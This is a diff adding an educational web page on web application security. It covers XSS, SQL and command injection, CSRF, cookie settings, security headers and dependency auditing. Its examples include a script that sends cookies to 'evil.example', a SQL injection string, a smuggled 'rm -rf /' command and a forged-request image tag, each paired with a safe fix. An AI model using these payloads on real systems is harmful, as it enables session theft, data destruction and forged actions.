@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Web application security — Computer science studies</title>
+  <meta name="description" content="Web application security: XSS, SQL injection, CSRF, input validation, security headers, cookies and dependencies.">
+  <link rel="icon" type="image/svg+xml" href="../../../favicon.svg">
+  <link rel="stylesheet" href="../../../stylesheets/base.css">
+  <link rel="stylesheet" href="../mis-estudios.css">
+  <script src="../../../scripts/theme-init.js"></script>
+  <script src="../../../scripts/main.js" defer type="module"></script>
+  <script src="../js/copiar.js" defer></script>
+  <link rel="manifest" href="../../../manifest.json" />
+  <link rel="apple-touch-icon" href="../../../assets/icons/icon-192.png" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+</head>
+<body id="HomePage" class="body-container">
+  <a class="saltar" href="#contenido" data-lang="skipToContent">Skip to content</a>
+
+  <nav class="navbar">
+    <a href="../../../index.html" class="logo-link" title="home" data-i18n-title="homeTitle">
+      <span class="navbar-name">Pablo Diaz</span>
+      <h2 data-lang="web-developer">Web Developer</h2>
+    </a>
+
+    <button type="button" class="btn" title="open menu" aria-expanded="false" aria-controls="sidebar" data-i18n-title="openMenu">
+      <span data-lang="menu">Menu</span>
+      <img src="../../../assets/icons/menu.svg" alt="" />
+    </button>
+  </nav>
+
+  <div class="main-content">
+    <main id="contenido" class="contenedor lectura">
+      <p class="volver"><a href="../index.html">← Back to index</a> · <a href="index.html">Versión en español</a></p>
+
+      <article class="estudio">
+        <header class="estudio__cabecera">
+          <p class="estudio__categoria">Security</p>
+          <h1>Web application security</h1>
+          <p class="entrada">
+            A web application receives data from people you do not control and shows it to people you do
+            not control either. Web security is, above all, <strong>deciding which data is
+            trustworthy</strong> and treating the rest as a threat. Here you will see the most common
+            attacks, how they are exploited and how to prevent them in your own code.
+          </p>
+        </header>
+
+        <nav class="tabla-contenido" aria-labelledby="toc-titulo">
+          <h2 id="toc-titulo">Contents</h2>
+          <ol>
+            <li><a href="#mentalidad">The mindset: do not trust the input</a></li>
+            <li><a href="#xss">XSS: code injection in the browser</a></li>
+            <li><a href="#sql">SQL and command injection</a></li>
+            <li><a href="#csrf">CSRF: forged requests with your session</a></li>
+            <li><a href="#validacion">Validate, sanitise and escape</a></li>
+            <li><a href="#cookies-sesiones">Session cookies</a></li>
+            <li><a href="#cabeceras">Security headers</a></li>
+            <li><a href="#dependencias">Dependencies and secrets</a></li>
+            <li><a href="#comprobaciones">Checking your own site</a></li>
+            <li><a href="#buenas-practicas">Best practices</a></li>
+            <li><a href="#ver-tambien">See also</a></li>
+          </ol>
+        </nav>
+
+        <section id="mentalidad" aria-labelledby="mentalidad-titulo">
+          <h2 id="mentalidad-titulo">The mindset: do not trust the input</h2>
+          <p>
+            Every piece of data that comes from outside — forms, URL parameters, headers, cookies,
+            uploaded files, API responses — is <strong>suspicious by default</strong>. Even if the
+            interface validates on the client side, anyone can send requests by hand with
+            <code>curl</code>, so the only validation that counts is the <em>server's</em>.
+          </p>
+          <p class="nota">
+            The classic rule: <em>«validate on input, escape on output»</em>. Check that the data has
+            the expected shape when it arrives, and turn it into harmless text right before using it,
+            according to the context where it will end up.
+          </p>
+        </section>
+
+        <section id="xss" aria-labelledby="xss-titulo">
+          <h2 id="xss-titulo">XSS: code injection in the browser</h2>
+          <p>
+            Cross-Site Scripting happens when user data ends up interpreted as JavaScript or HTML by
+            someone else's browser. The attacker runs code <em>on your site's origin</em>: it can read
+            the DOM, steal cookies and impersonate actions.
+          </p>
+          <p>Example vulnerable — a comment printed without escaping:</p>
+          <pre><code># The attacker writes this as a "comment"
+  &lt;script&gt;fetch('https://evil.example/?c=' + document.cookie)&lt;/script&gt;
+
+  // Rendered WITHOUT escaping: the script runs for every visitor
+  document.innerHTML = 'Comment: ' + comment;   // danger!</code></pre>
+          <p>Safe version: treat the data as text, never as HTML:</p>
+          <pre><code>// textContent does not interpret tags: the &lt;script&gt; stays as visible text
+  const paragraph = document.createElement('p');
+  paragraph.textContent = 'Comment: ' + comment;  // safe</code></pre>
+          <ul>
+            <li><strong>Reflected</strong>: the malicious data travels in the request itself (URL, form).</li>
+            <li><strong>Stored</strong>: it is saved (database) and attacks every visitor.</li>
+            <li><strong>DOM-based</strong>: client code manipulates the DOM with untrusted data.</li>
+          </ul>
+          <p class="nota">
+            Prefer APIs that assign text (<code>textContent</code>, <code>createTextNode</code>) over
+            those that assign HTML (<code>innerHTML</code>, <code>insertAdjacentHTML</code>).
+            <code>innerHTML</code> only with content you generated, never with user data.
+          </p>
+        </section>
+
+        <section id="sql" aria-labelledby="sql-titulo">
+          <h2 id="sql-titulo">SQL and command injection</h2>
+          <p>
+            If you concatenate user input inside an SQL statement or a system command, the user can
+            change what you execute. It is one of the oldest attacks and still frequent.
+          </p>
+          <p>Vulnerable: the user types <code>'' OR 1=1 --</code> as the password:</p>
+          <pre><code>const q = "SELECT * FROM users WHERE name='" + name + "' AND pass='" + pass + "'";</code></pre>
+          <p>Safe: the database distinguishes code from data for you:</p>
+          <pre><code>// Prepared statements: parameters are data, never SQL code
+  const rows = await db.query(
+    'SELECT id FROM users WHERE name = ? AND pass = ?',
+    [name, pass]
+  );</code></pre>
+          <pre><code># COMMAND INJECTION: never interpolate input into a shell
+  # Danger: input = "file.txt; rm -rf /"
+  exec('cat ' + input);
+
+  # Safe: passed as a separate argument, so the ';' is not interpreted
+  execFile('cat', [input]);  // or validate the exact expected shape</code></pre>
+        </section>
+
+        <section id="csrf" aria-labelledby="csrf-titulo">
+          <h2 id="csrf-titulo">CSRF: forged requests with your session</h2>
+          <p>
+            Cross-Site Request Forgery takes advantage of the browser automatically sending cookies
+            (session ones included) to your server, even when the request was triggered by another site.
+            If you are authenticated, a malicious page can «click on your behalf».
+          </p>
+          <pre><code>&lt;!-- On the attacker's page: your browser loads it and submits the form with your cookies --&gt;
+  &lt;img src="https://bank.example/transfer?amount=1000&amp;to=attacker"&gt;</code></pre>
+          <p>Common defences:</p>
+          <ul>
+            <li><strong>Anti-CSRF token</strong>: the server delivers a random value that the form sends back; the attacker cannot read it from another origin.</li>
+            <li><strong><code>SameSite</code> cookies</strong>: prevent the cookie from being sent in cross-site requests.</li>
+            <li><strong>No GET with side effects</strong>: actions that change data must require POST/PUT/DELETE.</li>
+            <li>Check the <code>Origin</code> or <code>Referer</code> header on critical changes.</li>
+          </ul>
+        </section>
+
+        <section id="validacion" aria-labelledby="validacion-titulo">
+          <h2 id="validacion-titulo">Validate, sanitise and escape</h2>
+          <p>They are three different operations, not synonyms:</p>
+          <table class="tabla">
+            <thead>
+              <tr>
+                <th scope="col">Operation</th>
+                <th scope="col">What it does</th>
+                <th scope="col">Example</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td>Validate</td><td>Reject what does not match the expected format</td><td>Email with <code>@</code>, numeric age, integer id</td></tr>
+              <tr><td>Sanitise</td><td>Clean the data by removing what is dangerous</td><td>Allow limited HTML in an editor</td></tr>
+              <tr><td>Escape</td><td>Encode the data for the output context</td><td><code>&lt;</code> → <code>&amp;lt;</code> in HTML; <code>\'</code> in SQL without prepared statements</td></tr>
+            </tbody>
+          </table>
+          <p>
+            <strong>Allowlist</strong> is better than blocklist: define what is allowed («only letters and
+            numbers») instead of trying to enumerate everything dangerous.
+          </p>
+          <pre><code>// Validate on the server side, not only on the client
+  const id = Number(req.params.id);
+  if (!Number.isInteger(id) || id <= 0) {
+    return res.status(400).json({ error: 'invalid id' });
+  }</code></pre>
+        </section>
+
+        <section id="cookies-sesiones" aria-labelledby="cookies-sesiones-titulo">
+          <h2 id="cookies-sesiones-titulo">Session cookies</h2>
+          <p>
+            The session cookie is the key to the user's account; configure it so that it is hard to steal
+            or to be used by other sites:
+          </p>
+          <pre><code>Set-Cookie: session=abc123;
+  Secure;          // travels over HTTPS only
+  HttpOnly;        // JavaScript cannot read it (mitigates theft via XSS)
+  SameSite=Lax;    // not sent in ordinary cross-site requests
+  Path=/;
+  Max-Age=3600;</code></pre>
+          <p>Besides: rotate the identifier on login, expire inactive sessions and invalidate the
+          session on the server on logout (deleting the cookie is not enough).</p>
+          <p class="nota">
+            <code>HttpOnly</code> does not prevent XSS, but it takes away the attacker's most valuable
+            target. Passwords and sensitive data go in the body of protected requests, never in URLs or
+            in <code>localStorage</code> reachable by any script on the page.
+          </p>
+        </section>
+
+        <section id="cabeceras" aria-labelledby="cabeceras-titulo">
+          <h2 id="cabeceras-titulo">Security headers</h2>
+          <p>
+            The server instructs the browser through response headers. They are a second layer that
+            limits the damage if something fails in your code:
+          </p>
+          <table class="tabla">
+            <thead>
+              <tr>
+                <th scope="col">Header</th>
+                <th scope="col">What it is for</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td><code>Content-Security-Policy</code></td><td>Allowlist of script/style origins; the strongest defence against XSS.</td></tr>
+              <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>Stops the browser from «guessing» MIME types and executing what it should not.</td></tr>
+              <tr><td><code>frame-ancestors</code> (CSP) or <code>X-Frame-Options</code></td><td>Prevents your site from being embedded in another (clickjacking).</td></tr>
+              <tr><td><code>Referrer-Policy</code></td><td>Controls how much of the origin URL travels to other sites.</td></tr>
+              <tr><td><code>Strict-Transport-Security</code></td><td>Forces HTTPS always (HSTS) for that domain.</td></tr>
+              <tr><td><code>Permissions-Policy</code></td><td>Disables browser APIs you do not use (camera, geolocation…).</td></tr>
+            </tbody>
+          </table>
+          <p>Example of a CSP policy for a self-contained site that loads no external resources:</p>
+          <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+  style-src 'self';
+  img-src 'self' data:;
+  frame-ancestors 'none';</code></pre>
+          <p class="nota">
+            Start in report mode (<code>Content-Security-Policy-Report-Only</code>) to see what your policy
+            would block before activating it, because a badly written CSP breaks legitimate scripts.
+          </p>
+        </section>
+
+        <section id="dependencias" aria-labelledby="dependencias-titulo">
+          <h2 id="dependencias-titulo">Dependencies and secrets</h2>
+          <p>
+            Your code is only part of the application: half the risk is in the libraries you use and in
+            the secrets that run it.
+          </p>
+          <ul>
+            <li>Keep a <strong>lockfile</strong> (<code>package-lock.json</code>) and audit it from time to time.</li>
+            <li>Update regularly: known vulnerabilities are patched, not ignored.</li>
+            <li>Fewer dependencies = smaller attack surface.</li>
+          </ul>
+          <pre><code># Audit Node dependencies (reports known vulnerabilities)
+  npm audit
+  npm audit fix
+
+  # Equivalent check in Python
+  pip-audit</code></pre>
+          <p><strong>Secrets</strong> (API keys, DB credentials) live outside the code: in environment
+          variables or a secret manager. The repository is public forever once published; rotate any
+          credential that has appeared in it.</p>
+          <pre><code># .gitignore before the first commit
+  .env
+  *.pem
+  # look in history if any slipped through: git log -S 'API_KEY'</code></pre>
+        </section>
+
+        <section id="comprobaciones" aria-labelledby="comprobaciones-titulo">
+          <h2 id="comprobaciones-titulo">Checking your own site</h2>
+          <p>Simple exercises you can do today, against your own site:</p>
+          <pre><code># 1) Which security headers do I return?
+  curl -I https://yourdomain.example/
+  curl -sI https://yourdomain.example/ | grep -iE 'content-security|strict|x-frame|referrer'
+
+  # 2) Do I accept requests from other origins where I should not? (check CORS)
+  curl -sI -H 'Origin: https://other-site.example' https://yourdomain.example/api/data \
+    | grep -i 'access-control-allow-origin'
+
+  # 3) Does my API accept absurd input without rejecting it?
+  curl -s "https://yourdomain.example/api/search?q=%3Cscript%3E" | grep -i script
+
+  # 4) Which cookies does my login set?
+  curl -sI -X POST https://yourdomain.example/login | grep -i set-cookie</code></pre>
+          <p class="nota">
+            Test only on your own projects or with explicit authorisation. These checks complement
+            <a href="../criptografia/index.en.html#comandos">Cryptography · Verification commands</a> and
+            <a href="../tls/index.en.html#comandos">Network security · Verifying TLS certificates</a>.
+          </p>
+        </section>
+
+        <section id="buenas-practicas" aria-labelledby="buenas-practicas-titulo">
+          <h2 id="buenas-practicas-titulo">Best practices</h2>
+          <ul>
+            <li>Always escape on output and use prepared statements on every SQL query.</li>
+            <li>Validate on the server even if the client also validates.</li>
+            <li>Generic errors to the user, details only in the logs; do not leak paths or versions.</li>
+            <li>Minimise permissions: session cookies carry <code>HttpOnly</code> and <code>SameSite</code>.</li>
+            <li>Add and review security headers; not all need external tools.</li>
+            <li>Update dependencies and rotate credentials; a leaked key expires the day it leaks.</li>
+            <li>Log failures: what is not measured is not protected.</li>
+          </ul>
+        </section>
+
+        <section id="ver-tambien" aria-labelledby="ver-tambien-titulo">
+          <h2 id="ver-tambien-titulo">See also</h2>
+          <ul class="ver-tambien">
+            <li><a href="../criptografia/index.en.html">Cryptography basics</a>: hashes, encryption and password hashing.</li>
+            <li><a href="../tls/index.en.html">Network security and TLS</a>: encryption in transit for HTTPS.</li>
+            <li><a href="../redes/index.en.html#http">Networks · HTTP</a>: where attacks and headers travel.</li>
+            <li><a href="../javascript/index.en.html#asincronia">JavaScript · Asynchrony</a>: the <code>fetch</code> that receives the data.</li>
+            <li><a href="../html/index.en.html">HTML</a>: the markup that can be infiltrated by XSS.</li>
+          </ul>
+        </section>
+      </article>
+
+      <p class="volver"><a href="../index.html">← Back to index</a> · <a href="index.html">Versión en español</a></p>
+    </main>
+  </div>
+
+  <div class="sidebar-overlay"></div>
+
+  <aside class="sidebar" id="sidebar" aria-label="Navigation menu">
+    <header class="sidebar-header">
+      <h2 data-lang="menu">Menu</h2>
+
+      <button type="button" class="btn btn-close" title="close menu" data-i18n-title="closeMenu">
+        <span data-lang="close">Close</span>
+        <img src="../../../assets/icons/close.svg" alt="" />
+      </button>
+    </header>
+
+    <nav class="sidebar-menu">
+      <div class="sidebar-item--group">
+        <a class="sidebar-item" href="../../../index.html#inicio">
+          <img src="../../../assets/icons/home.svg" alt="" />
+          <span data-lang="home">Home</span>
+        </a>
+
+        <button class="sidebar-expand" type="button" aria-expanded="false" aria-controls="sidebar-secciones"
+          title="show sections" aria-label="show sections" data-i18n-title="showSections" data-i18n-aria-label="showSections">
+          <img class="sidebar-chevron" src="../../../assets/icons/chevron_down.svg" alt="" />
+        </button>
+      </div>
+
+      <div class="sidebar-submenu" id="sidebar-secciones">
+        <a class="sidebar-item sidebar-subitem" href="../../../index.html#experiencia">
+          <img src="../../../assets/icons/docs.svg" alt="" />
+          <span data-lang="experienceTitle">Work Experience</span>
+        </a>
+
+        <a class="sidebar-item sidebar-subitem" href="../../../index.html#estudios">
+          <img src="../../../assets/icons/school.svg" alt="" />
+          <span data-lang="studiesTitle">Studies | Courses</span>
+        </a>
+
+        <a class="sidebar-item sidebar-subitem" href="../../../index.html#proyectos">
+          <img src="../../../assets/icons/code.svg" alt="" />
+          <span data-lang="projects">Projects</span>
+        </a>
+      </div>
+
+      <a class="sidebar-item active" href="../index.html" aria-current="page">
+        <img src="../../../assets/icons/menu_book.svg" alt="" />
+        <span data-lang="my-studies">My studies</span>
+      </a>
+
+      <a class="sidebar-item" href="../../my-games/index.html">
+        <img src="../../../assets/icons/gamepad.svg" alt="" />
+        <span data-lang="games">Games</span>
+      </a>
+      <a class="sidebar-item" href="../../my-programs/index.html">
+        <img src="../../../assets/icons/build.svg" alt="" />
+        <span data-lang="programs">Programs</span>
+      </a>
+    </nav>
+
+    <footer class="sidebar-footer">
+      <button type="button" class="btn btn-settings" title="Open settings" data-i18n-title="openSettings">
+        <span data-lang="settings">Settings</span>
+        <img src="../../../assets/icons/setting.svg" alt="" />
+      </button>
+    </footer>
+  </aside>
+
+  <dialog class="modal-dialog" aria-modal="true" aria-labelledby="modal-title">
+    <button type="button" class="btn modal-close" title="Close window (Esc)" aria-label="Close window" data-i18n-title="closeWindowHint" data-i18n-aria-label="closeWindow">&times;</button>
+    <div class="modal-dialog-body"></div>
+  </dialog>
+</body>
+
+</html>
